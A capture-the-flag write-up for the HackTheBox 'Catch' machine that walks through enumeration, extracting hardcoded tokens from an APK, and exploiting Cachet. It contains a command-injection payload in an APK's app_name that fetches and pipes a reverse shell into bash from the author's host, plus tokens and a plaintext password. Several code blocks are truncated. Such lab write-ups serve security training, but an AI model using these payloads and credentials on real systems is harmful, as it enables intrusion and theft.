# **Description**

Hello hackers, I hope you are doing well. We are doing [Catch](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.150

We found OpenSSH on port 80 and 4 websites on different ports (80, 3000, 5000, 8000)

## Web

Let's check port 80

![](1.png)

The links doesn't work in this page except for the `download` button that downloads an apk file.

Let's go to port 3000

![](2.png)

It's `gitea` version 1.14.1, we find user `root` by there are no repos.

Clicking on `API` we get a blank page, and after we click on `return to Gitea` we go to `gitea.catch.htb`. Let's add the domain to `/etc/hosts`

No if we clicked again on `API` we get something.

![](3.png)

Let's navigate to port 5000

![](4.png)

It's a login page for `let's chat`

Now let's go to port 8000.

![](5.png)

This is cachet, and searching for it on google i find this [article](https://www.sonarsource.com/blog/cachet-code-execution-via-laravel-configuration-injection/) that showcases multiple exploits in it.

One of the exploits i tried was this [one](https://github.com/W0rty/CVE-2021-39165) and it tries to grab the admin's password hash from the database using an unauthenticated sql injection with time delay, didn't have luck with that because every time it gets some wrong characters.

## APk

I tried avoiding the apk download until i remembered that i can decompile it and maybe get something from it.

The tool i used to decompile is `apktool`

```terminal
$ apktool d catchv1.0.apk
I: Using Apktool 2.5.0-dirty on catchv1.0.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/sirius/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

We get a directory with the apk's files.

```terminal
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/catch]
└──╼ $ cd catchv1.0

```

I used recursive grep to search for password but didn't get anything useful, then i searched for `token` and find the following.

```terminal
$ grep -Ri token ./                                                                                                                                      ./res/values/strings.xml:    <string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>                                        
./res/values/strings.xml:    <string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>                                                                                                                                                   
./res/values/strings.xml:    <string name="slack_token">xoxp-23984754863-2348975623103</string>                                                               
[...]                 
```

Found tree tokens, `gitea_token`, `lets_chat_token` and `slack_token`.

## let's chat

The gitea token doesn't work so we'll try with `let's chat`.

We can refer to [api docs](https://github.com/sdelements/lets-chat/wiki/API:-Authentication) of let's chat and see what we can get.

First, we use the token by adding the following header:

```bash
Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==
```

After reading the docs we find there rooms that we can see with a get request to `/rooms`

![](6.png)

Let's use burp for this

![](7.png)

We found three rooms. We can also read messages in the rooms with a get request to `/rooms/:room/messages` where `:room` is the id of the room

![](8.png)

In one of the rooms we find a message with some credentials.

We can use those to login to `cachet` on port 8000

![](9.png)

We can see the version is `2.4.0-dev`

# **Foothold**

One other vulnerability mentioned in the [article](https://www.sonarsource.com/blog/cachet-code-execution-via-laravel-configuration-injection/) is `CVE-2021-39174 - Configuration Leak`, and we can find an exploit right [here](https://github.com/n0kovo/CVE-2021-39174-PoC)

Let's run the exploit.

```terminal
$ python exploit.py -u http://catch.htb:8000 -n john -p 'E}V!mywu_69T4C}W'                                                                           1 ⨯

```terminal
$ ssh will@catch.htb

# **Privilege Escalation**

Let's run `pspy64` and see what we find:

There is a script called verify.sh that's running regularly, let's check it out.

The part that's useful to us is the Basic App Checks which is vulnerable to command injection.

The script goes to /opt/mnd/apk_bin and checks for `.apk` files, if it finds one it extract it and checks the `app_name` in `/res/value/strings.xml`, the vulnerability is in this line `echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'`, and if we can control the APP_NAME variable we can inject command.

Using the apk file we got earlier, we go to the `strings.xml` file and we add a command in the `app_name`

```terminal
$ grep -Ri app_name catchv1.0/res/values/strings.xml
    <string name="app_name">Catch;curl 10.10.17.90/shell.sh | bash;</string>
```

The command I added requests a reverse shell from my web server and pip to bash.

Now we compile the application.

```terminal
$ java -jar apktool_2.7.0.jar b catchv1.0 -o hacked.apk
I: Using Apktool 2.7.0
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk into: hacked.apk
```

I got an error using the `apktool` binary on my system, and the solution was using a newer [version](https://github.com/iBotPeaches/Apktool/releases/tag/v2.7.0)

Now we upload the file to the target and wait for it to get inspected.
